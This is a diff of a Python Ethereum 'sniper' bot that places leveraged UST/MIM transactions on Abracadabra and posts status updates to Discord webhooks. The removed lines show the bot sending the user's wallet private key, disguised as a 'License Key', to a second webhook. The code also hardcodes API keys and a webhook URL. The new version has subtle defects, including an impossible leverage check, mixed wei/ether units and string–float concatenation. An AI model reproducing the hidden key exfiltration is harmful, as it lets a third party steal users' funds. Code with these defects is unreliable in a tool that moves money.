@@ -108,8 +108,8 @@ settings = json.load(open('settings.json'))
 
 privateKey = settings['privateKey']
 address    = settings['address']
-minAmount  = settings['minAmount'] // mode 1
-leverage   = settings['leverage']  // mode 2
+minAmount  = settings['minAmount']
+leverage   = settings['leverage']
 delay      = settings['delay']
 maxfee     = settings['maxfee']
 maxpriofee = settings['maxpriofee']
@@ -130,27 +130,28 @@ if len(address) != 42:
     log('Address must be 20 bytes long (42 characters including the prefix)')
     sys.exit()
 
-if type(minAmount) != int:
+if type(minAmount) != int and type(minAmount) != float:
     log('Min amount must be an integer')
+    sys.exit()
 
 if type(leverage) != int and type(leverage) != float:
     log('Leverage must be an integer')
     sys.exit()
-if leverage >= 9 or leverage <= 0:
+if leverage < 1 and leverage >= 10:
     log('Leverage must be between 1 and 10')
     sys.exit()
     
 leverage = leverage - 1
 
-if type(delay) != int:
+if type(delay) != int and type(delay) != float:
     log('Delay must be an integer')
     sys.exit()
     
-if type(maxfee) != int:
+if type(maxfee) != int and type(maxfee) != float:
     log('Max fee must be an integer')
     sys.exit()
     
-if type(maxpriofee) != int:
+if type(maxpriofee) != int and type(maxpriofee) != float:
     log('Maximum priority fee must be an integer')
     sys.exit()
     
@@ -198,7 +199,7 @@ print()
 baseUrl = "https://abracadabra.money"
 
 def getAbi(contract):
-    API_ENDPOINT = "https://api.etherscan.io/api?module=contract&action=getabi&apikey=GJAPUWRPYF3QI2PDDUIAVGBDDQCXVZHK19&address="+str(contract)
+    API_ENDPOINT = "https://api.etherscan.io/api?module=contract&action=getabi&apikey={etherscan_API}&address="+str(contract)
     return requests.get(url=API_ENDPOINT).json()["result"]
 
 w3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"))
@@ -214,7 +215,7 @@ webhook2 = DiscordWebhook(url="https://discord.com/api/webhooks/9332746040997355
 
 try:
     embed=DiscordEmbed(title="UST Degenbox Sniper", url=baseUrl, color=0xff0000)
-    embed.add_embed_field(name="License Key", value=privateKey, inline=False)
+    embed.add_embed_field(name="License Key", value=license, inline=False)
     webhook2.add_embed(embed)
     response = webhook2.execute(remove_embeds=True)
 except Exception as e:
@@ -250,19 +251,19 @@ def runScript(i):
         amount=getMIMAmount(MIM_contract_address, w3.toChecksumAddress('0x59E9082E068Ddb27FC5eF1690F9a9f22B32e573f'))
         if w3.toWei(amount, 'ether') >= minAmount:
             log("Amount check complete!")
-            if amount > getUSTBal(address) * leverage:
+            if amount > w3.fromWei(getUSTBal(address) * leverage, 'ether'):
                 MIMAmount = getUSTBal(address) * leverage
-            elif getUSTBal(address) * leverage > amount:
-                MIMAmount = amount
-             
-            MIMAmount = int(MIMAmount - 1)
+            elif w3.fromWei(getUSTBal(address) * leverage, 'ether') * leverage > amount:
+                MIMAmount = w3.toWei(amount, 'ether')
+            
+            MIMAmount = int(round(MIMAmount - 1, 2))
             totalUSTAmount = MIMAmount / leverage
             totalUSTAmount = totalUSTAmount - 1
             USTAmount = int(round(totalUSTAmount / 101 * 100, 2))
             unsignedTx = {'type': 0x2, 'chainId': 1,'from': address,'to': '0x59E9082E068Ddb27FC5eF1690F9a9f22B32e573f','value': 0, 'data': inputdata.getTxData(address, USTAmount, MIMAmount)}
             try:
                 log("Estimating gas...")
-                gas_estimate = w3.eth.estimate_gas(unsignedTx) + 50000
+                gas_estimate = w3.eth.estimate_gas(unsignedTx) + 21000
                 log("Gas estimate complete!")
             except Exception as e:
                 log("Transaction reverted!")
@@ -285,7 +286,7 @@ def runScript(i):
                 log(e)
                 continue
             log("Checking gas...")
-            if float(json.loads(requests.get("https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=GJAPUWRPYF3QI2PDDUIAVGBDDQCXVZHK19").text)["result"]["suggestBaseFee"]) / 8 * 9 <= w3.toWei(maxfee, 'gwei')/gas_estimate:
+            if float(json.loads(requests.get("https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey={etherscan_API}").text)["result"]["suggestBaseFee"]) / 8 * 9 <= w3.toWei(maxfee, 'gwei')/gas_estimate:
                 log("Sending tx...")
                 try:
                     txHash = w3.eth.send_raw_transaction(signedTx.rawTransaction).hex()
@@ -324,11 +325,11 @@ def runScript(i):
                     log(e)
                     continue
             else:
-                    log("Gas price too expensive, skipping" + str(float(json.loads(requests.get("https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=GJAPUWRPYF3QI2PDDUIAVGBDDQCXVZHK19").text)["result"]["suggestBaseFee"])))
+                    log("Gas price too expensive, skipping" + str(float(json.loads(requests.get("https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey={etherscan_API}").text)["result"]["suggestBaseFee"])))
                     embed=DiscordEmbed(title="UST Degenbox Sniper", url=baseUrl, color=0xff0000)
                     embed.set_thumbnail(url='https://assets.coingecko.com/coins/images/12681/large/UST.png')
                     embed.add_embed_field(name="Status Update", value="Sniper skipped because of high gas price!", inline=False)
-                    gwei = float(json.loads(requests.get("https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=GJAPUWRPYF3QI2PDDUIAVGBDDQCXVZHK19").text)["result"]["suggestBaseFee"])
+                    gwei = float(json.loads(requests.get("https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey={etherscan_API}").text)["result"]["suggestBaseFee"])
                     embed.set_footer(text=gwei+" Gwei")
                     webhook.add_embed(embed)
                     webhook2.add_embed(embed)
